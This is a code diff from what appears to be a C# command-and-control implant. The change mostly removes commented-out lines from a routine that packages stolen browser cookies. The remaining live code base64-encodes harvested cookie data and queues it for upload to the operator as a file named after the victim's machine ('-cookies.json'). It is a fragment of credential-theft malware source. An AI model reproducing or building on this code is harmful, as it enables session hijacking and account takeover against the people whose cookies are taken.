@@ -524,24 +524,7 @@ namespace Agent
                     chunk_data = Misc.Base64Encode(this.cookiesOut[response.task_id]),
                     file_id = response.file_id,
                 },
-                //file_id = response.file_id,
             };
-
-
-
-            //Console.WriteLine($"Returning {this.cookiesOut[response.task_id].Length} bytes");
-            //DownloadResponse dr = new DownloadResponse()
-            //{
-            //    task_id = response.task_id,
-            //    file_id = response.file_id,
-                
-            //    download = new DownloadResponseData
-            //    {
-            //        chunk_num = 1,
-            //        file_id = response.file_id,
-            //        chunk_data = Misc.Base64Encode(this.cookiesOut[response.task_id]),
-            //   }
-            //};
 
             await this.messageManager.AddResponse(dr.ToJson());
 
@@ -554,45 +537,13 @@ namespace Agent
                 download = new DownloadResponseData()
                 {
                     total_chunks = 1,
-                    //full_path = downloadJob.path,
                     filename = $"{Environment.MachineName}-cookies.json",
                     chunk_num = 0,
                     chunk_data = string.Empty,
                     is_screenshot = false,
                 },
-                //user_output = string.Empty,
                 task_id = task_id,
-                //completed = false,
-                //status = string.Empty,
-                //file_id = null
             }.ToJson());
-
-
-
-
-            //await messageManager.AddResponse(new DownloadResponse
-            //{
-            //    download = new DownloadResponseData()
-            //    {
-            //        total_chunks = 1,
-            //        filename = $"{Environment.MachineName}-cookies.json",
-            //    },
-            //    task_id = task_id,
-            //    completed = false,
-            //}.ToJson());
         }
-        //private bool CookieBroify(string cookies, string task_id)
-        //{
-        //    JsonDocument responseJsonDocument = JsonDocument.Parse(cookies);
-        //    JsonElement responseRoot = responseJsonDocument.RootElement;
-
-        //    if (responseRoot.TryGetProperty("result", out JsonElement resultElement))
-        //    {
-        //        cookiesOut.Add("task_id", resultElement.GetRawText());
-        //        StartSendFile(task_id);
-        //        return true;
-        //    }
-        //    return false;
-        //}
     }
 }
